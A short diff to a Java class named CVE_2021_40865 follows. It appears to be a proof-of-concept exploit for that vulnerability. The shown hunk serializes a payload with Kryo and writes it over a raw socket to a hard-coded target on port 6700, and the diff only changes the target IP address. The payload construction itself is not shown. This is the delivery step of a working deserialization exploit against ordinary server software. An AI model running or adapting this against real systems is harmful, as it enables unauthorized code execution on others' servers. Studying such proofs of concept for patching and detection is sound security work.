@@ -47,7 +47,7 @@ public class CVE_2021_40865 {
             // Kryo serialization
             byte[] bytes = buffer(getSerializer(), payload);
             // Send bytes
-            Socket socket = new Socket("10.41.230.66", 6700);
+            Socket socket = new Socket("10.58.120.200", 6700);
             OutputStream outputStream = socket.getOutputStream();
             outputStream.write(bytes);
             outputStream.flush();
